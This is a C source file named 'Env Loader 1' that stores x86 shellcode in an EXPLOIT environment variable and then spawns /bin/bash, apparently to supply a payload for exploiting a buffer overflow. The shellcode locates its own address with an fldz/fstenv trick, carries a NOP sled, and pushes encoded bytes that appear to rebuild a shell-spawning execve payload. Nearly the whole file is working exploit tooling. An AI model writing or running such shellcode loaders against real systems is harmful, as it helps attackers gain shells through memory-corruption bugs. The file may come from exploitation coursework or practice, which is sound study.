#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char shellcode[] =
  // get %eip
  "\xd9\xee" //fldz
  "\x9b\xd9\x74\x24\xf4" //fstenv -0xc(%esp)
  "\x58" // pop
  //extra space to push the code
  "\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90"
  //-------------------
  "\x55"
  "\x89\xe5"
  // Point %esp to the code segment
  "\x89\xc4" //mov %eax,%esp
  "\xb8\xd8\x85\x66\xc0"
  "\xd1\xe0"         
  "\x50"            
  "\x68\x31\xc9\x31\xd2"
  "\x68\x69\x6e\x89\xe3"
  "\x68\x68\x68\x2f\x62"
  "\x68\x68\x2f\x2f\x73"
  "\x68\x80\x31\xc0\x50"
  "\xb8\x5d\xf7\x81\xe6"
  "\xd1\xe0"         
  "\x48"            
  "\x50"            
  "\xb8\x5d\xf7\x01\x33"
  "\xd1\xe0"         
  "\x40"            
  "\x50"            
  "\x68\xc9\xb0\x46\x66"
  "\xb8\xe0\x98\xed\x18"
  "\xd1\xe0"         
  "\x50"            
  "\x68\x55\x89\xe5\x31"
  "\xff\xe4"         
  ;


void print_info() {
  printf("#########################################################\n");
  printf("#                     Env Loader 1                      #\n");
  printf("#########################################################\n");
  printf("# Usage: ./envloader                                    #\n");
  printf("#                                                       #\n");
  printf("# Shellcode set in variable $EXPLOIT                    #\n");
  printf("#########################################################\n");
  printf("# Shellcode locked and loaded!                          #\n");
  printf("#########################################################\n\n");
}

int main(int argc, char* argv[]) {
  char* buffer;
  
  buffer = (char*) malloc(sizeof(shellcode) + 10);

  /* ENV variable name */
  strcpy(buffer,"EXPLOIT=");
  
  /* set the shellcode itself */
  strcat(buffer,shellcode);
  
  putenv(buffer);

  print_info();

  system("/bin/bash");

  free(buffer);
}
